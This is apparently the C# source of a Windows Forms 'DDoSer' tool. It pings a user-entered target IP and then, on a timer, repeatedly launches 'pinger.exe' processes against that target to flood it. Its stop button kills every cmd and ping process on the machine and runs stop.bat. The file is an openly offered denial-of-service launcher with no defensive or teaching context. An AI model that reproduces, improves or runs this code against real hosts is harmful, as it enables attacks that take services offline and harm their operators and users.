using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DDoSer
{
    public partial class Form1 : Form
    {
        private bool pingable = false;
        private int sent = 0;
        public Form1()
        {
            InitializeComponent();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            bool pingable = false;
            Ping pinger = null;

            try
            {
                pinger = new Ping();
                PingReply reply = pinger.Send(target.Text);
                pingable = reply.Status == IPStatus.Success;
            }
            catch (PingException)
            {
                pingable = false;
                fire.Enabled = false;
                status.Text = "The IP does not work. (0x01)";
            }
            if (pingable == true)
            {
                fire.Enabled = true;
                status.Text = "Ready to FIRE!";
            }
            else if (pingable == false)
            {
                pingable = false;
                fire.Enabled = false;
                status.Text = "The IP does not work. (0x02)";
            }
        }

        private void target_TextChanged(object sender, EventArgs e)
        {
            fire.Enabled = false;
            status.Text = "       ";
        }

        private void numericUpDown1_ValueChanged(object sender, EventArgs e)
        {
            int interval = Decimal.ToInt32(numericUpDown1.Value);
            ddoser.Interval = interval;
        }

        private void intervaller_Tick(object sender, EventArgs e)
        {
            interval.Text = "Current Interval: " + ddoser.Interval.ToString();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            sent = 0;
            intervaller.Start();
        }

        private void fire_Click(object sender, EventArgs e)
        {
            Console.WriteLine("Starting...");
            sent = 0;
            fire.Visible = false;
            status.Text = "DDoSing in progress...";
            button1.Visible = true;
            ddoser.Start();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Console.WriteLine("Stopping...");
            sent = 0;
            button1.Visible = false;
            fire.Visible = true;
            status.Text = "Ready to FIRE!";
            ddoser.Stop();
            try
            {
                Process[] workers = Process.GetProcessesByName("cmd");
                foreach (Process worker in workers)
                {
                    worker.Kill();
                    worker.WaitForExit();
                    worker.Dispose();
                }
            }
            catch
            {
                Console.WriteLine("Cannot kill the cmd proccess.");
            }
            try
            {
                Process[] workers = Process.GetProcessesByName("ping");
                foreach (Process worker in workers)
                {
                    worker.Kill();
                    worker.WaitForExit();
                    worker.Dispose();
                }
            }
            catch
            {
                Console.WriteLine("Cannot kill the ping proccess.");
            }
            try
            {
                Process[] workers = Process.GetProcessesByName("pinger");
                foreach (Process worker in workers)
                {
                    worker.Kill();
                    worker.WaitForExit();
                    worker.Dispose();
                }
            }
            catch
            {
                Console.WriteLine("Cannot kill the pinger proccess.");
            }
            Process.Start("stop.bat");
            Process.Start("stop.bat");
        }

        private void ddoser_Tick(object sender, EventArgs e)
        {
            sent = sent + 1;
            status.Text = "DDoSing... Pingers: " + sent.ToString();
            Process.Start("pinger.exe", target.Text);
            Console.WriteLine("Started pinger #" + sent);
        }
    }
}
